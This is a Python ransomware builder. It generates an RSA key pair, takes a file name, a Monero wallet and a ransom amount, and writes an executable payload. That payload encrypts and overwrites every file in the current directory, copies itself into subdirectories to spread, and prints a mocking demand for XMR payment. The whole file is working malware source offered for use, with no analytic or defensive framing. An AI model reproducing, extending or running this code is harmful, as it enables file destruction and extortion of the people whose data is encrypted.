#!/bin/python3.9
import subprocess
import shlex
import base64
from Crypto.PublicKey import RSA

thekey = RSA.generate(2048)
private_key = thekey.export_key()
public_key = thekey.publickey().export_key()

with open('private.key', 'wb') as private:
    private.write(private_key)

with open('public.key', 'wb') as public:
    public.write(public_key)

pubkey_encoded = base64.b64encode(public_key)
filename = input("What would you like to name your file? ")
wallet_address = input("Enter path to XMR wallet address: ")

with open(wallet_address, "r") as thewallet:
    wallet = thewallet.read()

quantity = input("How much XMR would you like to ransom? ")

text = f"""
#!/usr/bin/python
import base64
import os
import shutil
import shlex
from subprocess import Popen, PIPE
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP, AES

encoded_key = {pubkey_encoded}
public_key = base64.b64decode(encoded_key)

files = []
subdir = []

def encrypt(datafile, publickey):
    datafile = str(datafile)
    with open(datafile, "rb") as f:
        data = f.read()

    data = bytes(data)

    key = RSA.import_key(publickey)
    sessionkey = os.urandom(16)

    cipher = PKCS1_OAEP.new(key)
    encryptedSessionKey = cipher.encrypt(sessionkey)

    cipher = AES.new(sessionkey, AES.MODE_EAX)
    ciphertext, tag = cipher.encrypt_and_digest(data)

    encryptedFile = datafile
    with open(encryptedFile, "wb") as thefile:
        [ thefile.write(x) for x in (encryptedSessionKey, cipher.nonce, tag, ciphertext) ]

def gather():
    for file in os.listdir():
        if os.path.isfile(file):
            if file == "{filename}":
                continue
            files.append(file)

    for file in files:
        encrypt(file, public_key)
        print("Files encrypted...")

gather()

subdir = []

# Change this if compiling an executable
cmd = "python3 {filename}"

for dir in os.listdir("."):
    d = os.path.join(".", dir)
    if os.path.isdir(dir):
        subdir.append(dir)

for item in subdir:
    subdir = "".join(item)
    shutil.copy("{filename}", item)
    os.chdir(item)
    Popen(shlex.split(cmd), stdin=PIPE, stderr=PIPE, stdout=PIPE)
    print("Files encrypted...")
    os.chdir("..")

wallet = '''{wallet}'''
message = '''
Looks like someone was stupid enough to download my ransomware.
Send {quantity} XMR to the wallet provided.
'''

print(message)

"""

with open(filename, "w") as payload:
    payload.write(text)
    print("Ransomware Generated...")
    executable = f"chmod +x {filename}"
    subprocess.call(shlex.split(executable))
    print("Your file is ready to be executed...")
